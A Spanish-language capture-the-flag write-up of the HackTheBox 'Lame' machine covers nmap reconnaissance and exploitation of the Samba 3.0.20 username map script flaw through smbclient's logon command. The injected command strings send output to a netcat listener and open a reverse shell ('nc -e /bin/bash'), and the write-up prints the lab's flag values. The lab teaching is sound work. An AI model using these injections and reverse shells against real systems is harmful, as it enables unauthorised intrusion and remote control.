# INFORMACIÓN:

La máquina Lame es una máquina Linux de dificultad Fácil, la técnica empleada es una Command Execution (Samba 3.0.20 < 3.0.25rc3 - Username Map Script).
# PROCEDIMIENTO:

## 1. RECONOCIMIENTO:

En primer lugar hacemos un ping a la máquina para comprobar si está activa:
$ping -c 1 10.10.10.3
Vemos que hemos enviado un paquete y hemos recibido otro paquete, por lo tanto está activa. Como se ve en el ttl (63) nos indica que estamos ante una máquina Linux.

A continuación realizamos un escaneo para ver los puertos abiertos a través del protocolo TCP.
$nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.3

Vemos que los puertos '21, 22, 139, 445' están abiertos, por lo que procedemos a realizar un escaneo de servicios y versiones que corren en dichos puertos.
$nmap -sCV -p21,22,139,445 10.10.10.3

Vemos que en el puerto 21 corre una versión de vsftpd 2.3.4, está versión tiene una vulnerabilidad que permite una ejecución remota de comandos, pero en este caso no se puede aplicar.

En el puerto 445 corre una versión de Samba 3.0.20, la cual presenta una vulnerabilidad que nos permite ejecutar comandos de forma remota.

## 2. EXPLOIT
En primer lugar listamos el contenido a través de smbclient :
$smbclient -L 10.10.10.3 -N --option 'client min protocol = NT1'

Vemos un recurso compartido mediante tmp, por lo que nos conectamos al recurso compartido en tmp:
$smbclient //10.10.10.3/tmp -N --option 'client min protocol = NT1'

Mediante el comando logon podemos introducir comandos para que sean ejecutados por la máquina víctima.
Para comprobar esto vamos a mandar un ping a nuestra máquina.
$tcpdump -i tun0 icmp -n
$logon "/=``nohup ping -c 1 10.10.14.108``"

Recibimos el ping en nuestra máquina por lo cual el comando se está ejecutando.

$nc -nlvp 433
$logon "/=`nohup whoami | nc 10.10.14.108 443`"

Recibimos el mensaje de 'root'

$nc -nlvp 443
$logon "/=`nohup ifconfig | nc 10.10.14.108 443`"

Vemos como la IP corresponde a la máquina víctima, por lo tanto los comandos son ejecutados por esta. A continuación, nos mandamos una consola:
$logon "/=`nohup nc -e /bin/bash 10.10.14.108 443`"

Ahora realizaremos el tratamiento de la tty:
$tty
$script /dev/null -c bash
Ctrl + z
$stty raw -echo; fg
$reset xterm
$export SHELL=bash
$export TERM=xterm
En una ventana a parte del sistema hacemos un:
$stty size
En la consola interactiva hacemos:
$stty rows 38 columns 184

Finalmente buscamos la flag del usuario.
$find / -name "user.txt" | xargs cat
7077790f0cc668fa879e5222c1992017

Y la flag de root.
$find / -name "root.txt" | xargs cat
1cacf1088d7b43924a1da8b7b7cafdee